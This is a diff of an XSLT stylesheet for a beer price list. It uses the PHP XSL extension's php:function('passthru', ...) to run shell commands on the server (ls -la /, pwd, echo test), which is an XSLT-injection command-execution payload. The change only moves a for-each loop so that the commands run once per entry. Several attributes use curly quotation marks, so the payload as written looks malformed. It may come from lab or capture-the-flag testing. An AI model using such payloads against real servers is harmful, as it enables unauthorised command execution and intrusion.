@@ -1,7 +1,8 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
 <body style="font-family:Arial;font-size:12pt;background-color:#000000">
-        <xsl:value-of select=”php:function(‘passthru’,’ls -la /’)”/>    
+  <xsl:for-each select="beers/beer">
+            <xsl:value-of select=”php:function(‘passthru’,’ls -la /’)”/>    
         <xsl:value-of select=”php:function(‘passthru’,’ls/’)”/>    
         <xsl:value-of select=”php:function(‘passthru’,’pwd/’)”/>    
         <xsl:value-of select=”php:function(‘passthru’,’echo test/’)”/> 
@@ -9,8 +10,6 @@
         <xsl:value-of select=”php:function(‘passthru’,’ls’)”/>    
         <xsl:value-of select=”php:function(‘passthru’,’pwd’)”/>    
         <xsl:value-of select=”php:function(‘passthru’,’echo test’)”/> 
-
-  <xsl:for-each select="beers/beer">
   <div style="background-color:black;color:red;padding:4px">
     <span style="font-weight:bold"><xsl:value-of select="name"/> - </span>
     <xsl:value-of select="price"/>
